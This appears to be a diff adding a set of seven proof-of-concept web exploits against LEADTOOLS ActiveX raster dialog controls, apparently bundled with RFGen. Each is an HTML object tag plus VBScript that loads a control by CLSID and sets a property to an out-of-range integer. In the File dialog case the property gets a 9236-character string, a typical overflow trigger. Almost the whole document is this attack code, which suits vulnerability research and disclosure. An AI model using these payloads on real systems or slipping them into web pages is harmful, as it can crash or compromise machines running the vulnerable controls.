@@ -1,0 +1,104 @@
+1. (Web, LtocxWebDlgu.dll / LTRDWU.DLL):
+------------------------------------------------------
+ 
+ &lt;object classid=&#039;clsid:00165B53-B1BA-11CE-ABC6-F5B2E79D9E3F&#039; id=&#039;target&#039; /&gt;
+ &lt;script language=&#039;vbscript&#039;&gt;
+ targetFile = &quot;C:\Program Files\RFGen40\LtocxWebDlgu.dll&quot;
+ prototype  = &quot;Property Let Bitmap As Long&quot;
+ memberName = &quot;Bitmap&quot;
+ progid     = &quot;LTRASTERDLGWEBLib_U.LEADRasterDlgWeb_U&quot;
+ argCount   = 1
+ arg1=-1
+ target.Bitmap = arg1
+ &lt;/script&gt;
+ 
+ 
+2. (Effects, LtocxEfxDlgu.dll / LTRDEU.DLL):
+------------------------------------------------------
+ 
+ &lt;object classid=&#039;clsid:00165B5B-B1BA-11CE-ABC6-F5B2E79D9E3F&#039; id=&#039;target&#039; /&gt;
+ &lt;script language=&#039;vbscript&#039;&gt;
+ targetFile = &quot;C:\Program Files\RFGen40\LtocxEfxDlgu.dll&quot;
+ prototype  = &quot;Property Let Bitmap As Long&quot;
+ memberName = &quot;Bitmap&quot;
+ progid     = &quot;LTRASTERDLGEFXLib_U.LEADRasterDlgEfx_U&quot;
+ argCount   = 1
+ arg1=-1
+ target.Bitmap = arg1
+ &lt;/script&gt;
+ 
+ 
+3. (Image, LtocxImgDlgu.dll / LTRDMU.DLL):
+------------------------------------------------------
+ 
+ &lt;object classid=&#039;clsid:00165C7B-B1BA-11CE-ABC6-F5B2E79D9E3F&#039; id=&#039;target&#039; /&gt;
+ &lt;script language=&#039;vbscript&#039;&gt;
+ targetFile = &quot;C:\Program Files\RFGen40\LtocxImgDlgu.dll&quot;
+ prototype  = &quot;Property Let Bitmap As Long&quot;
+ memberName = &quot;Bitmap&quot;
+ progid     = &quot;LTRASTERDLGIMGLib_U.LEADRasterDlgImg_U&quot;
+ argCount   = 1
+ arg1=2147483647
+ target.Bitmap = arg1
+ &lt;/script&gt;
+ 
+ 
+4. (Image Effects, LtocxImgEfxDlgu.dll / LTRDXU.DLL):
+------------------------------------------------------
+ 
+ &lt;object classid=&#039;clsid:00165B57-B1BA-11CE-ABC6-F5B2E79D9E3F&#039; id=&#039;target&#039; /&gt;
+ &lt;script language=&#039;vbscript&#039;&gt;
+ targetFile = &quot;C:\Program Files\RFGen40\LtocxImgEfxDlgu.dll&quot;
+ prototype  = &quot;Property Let Bitmap As Long&quot;
+ memberName = &quot;Bitmap&quot;
+ progid     = &quot;LTRASTERDLGIMGEFXLib_U.LEADRasterDlgImgEfx_U&quot;
+ argCount   = 1
+ arg1=-2147483647
+ target.Bitmap = arg1
+ &lt;/script&gt;
+ 
+ 
+5. (Image Document, LtocxImgDocDlgu.dll / LTRDOU.DLL):
+------------------------------------------------------
+ 
+ &lt;object classid=&#039;clsid:00165B69-B1BA-11CE-ABC6-F5B2E79D9E3F&#039; id=&#039;target&#039; /&gt;
+ &lt;script language=&#039;vbscript&#039;&gt;
+ targetFile = &quot;C:\Program Files\RFGen40\LtocxImgDocDlgu.dll&quot;
+ prototype  = &quot;Property Let Bitmap As Long&quot;
+ memberName = &quot;Bitmap&quot;
+ progid     = &quot;LTRASTERDLGIMGDOCLib_U.LEADRasterDlgImgDoc_U&quot;
+ argCount   = 1
+ arg1=2147483647
+ target.Bitmap = arg1
+ &lt;/script&gt;
+ 
+ 
+6. (Color, LtocxClrDlgu.dll / LTRDRU.DLL):
+------------------------------------------------------
+ 
+ &lt;object classid=&#039;clsid:00165B4F-B1BA-11CE-ABC6-F5B2E79D9E3F&#039; id=&#039;target&#039; /&gt;
+ &lt;script language=&#039;vbscript&#039;&gt;
+ targetFile = &quot;C:\Program Files\LEAD Technologies\LEADTOOLS Active-X 16.5\Bin\CDLL\Win32\LtocxClrDlgu.dll&quot;
+ prototype  = &quot;Property Let UserPalette ( ByVal iIndex As Integer ) As Long&quot;
+ memberName = &quot;UserPalette&quot;
+ progid     = &quot;LTRASTERDLGCLRLib_U.LEADRasterDlgClr_U&quot;
+ argCount   = 2
+ arg1=1
+ arg2=-2147483647
+ target.UserPalette(arg1 ) = arg2
+ &lt;/script&gt;
+ 
+ 
+7. (File, LtocxFileDlgu.dll / LTRDFU.DLL):
+------------------------------------------------------
+ 
+ &lt;object classid=&#039;clsid:00165C87-B1BA-11CE-ABC6-F5B2E79D9E3F&#039; id=&#039;target&#039; /&gt;
+ &lt;script language=&#039;vbscript&#039;&gt;
+ targetFile = &quot;C:\Program Files\RFGen40\LtocxFileDlgu.dll&quot;
+ prototype  = &quot;Property Let DestinationPath As String&quot;
+ memberName = &quot;DestinationPath&quot;
+ progid     = &quot;LTRASTERDLGFILELib_U.LEADRasterDlgFile_U&quot;
+ argCount   = 1
+ arg1=String(9236, &quot;A&quot;)
+ target.DestinationPath = arg1
+ &lt;/script&gt;
